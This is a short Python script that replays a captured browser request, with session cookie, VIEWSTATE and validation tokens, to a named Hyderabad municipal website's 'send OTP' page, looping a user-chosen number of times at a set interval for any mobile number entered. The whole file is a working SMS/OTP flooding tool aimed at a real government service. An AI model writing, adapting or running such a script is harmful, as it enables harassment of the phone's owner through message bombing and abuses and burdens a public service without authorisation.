import requests
import time

def send_otp_request(mobile_number, repeat_times, interval):
    url = "https://igs.ghmc.gov.in/send_otp_mobile.aspx"
    headers = {
        "Host": "igs.ghmc.gov.in",
        "Cookie": "ASP.NET_SessionId=jgsiqaloewfaa3ivnsufrm5c",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": "\"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Linux\"",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "https://igs.ghmc.gov.in",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://igs.ghmc.gov.in/send_otp_mobile.aspx",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=0, i",
        "Connection": "keep-alive"
    }
    data = {
        "__VIEWSTATE": "CDYm9PAq9eabbtfaMjVdpNFXHQ4FXhS9H68UlYzMB4wvHYvmd6euTaYRvGNS+hjoUadGpgOz24Bm4D6M/72yX+NrTAS9LOE9F8a/6te58mtxKbVsrxnzDhj+YsfFnyfx",
        "__VIEWSTATEGENERATOR": "CAE609E2",
        "__EVENTVALIDATION": "XIEPHfhYCh569VO3LPRUadDUIjc1vqYtyHA0i4JNFBbIINfUEAWuyAI8dD1V4xxD+3g3UVBzN6A5l7M9t2Qn3209LFVIcAXtqPcrpL5LUBJMfOt0lvbN8VPjy5djap0Vj1lXECLY5hI4ePXX65BoyA==",
        "txtmobileno": mobile_number,
        "btnsendOTP": "Send OTP"
    }

    for _ in range(repeat_times):
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            print("OTP request sent successfully.")
        else:
            print("Failed to send OTP request.")
        time.sleep(interval)  # Wait for the specified interval before sending the next request

def main():
    mobile_number = input("Enter your mobile number: ")
    repeat_times = int(input("Enter the number of times to repeat the request: "))
    interval = int(input("Enter the time interval between requests (in seconds): "))
    send_otp_request(mobile_number, repeat_times, interval)

if __name__ == "__main__":
    main()
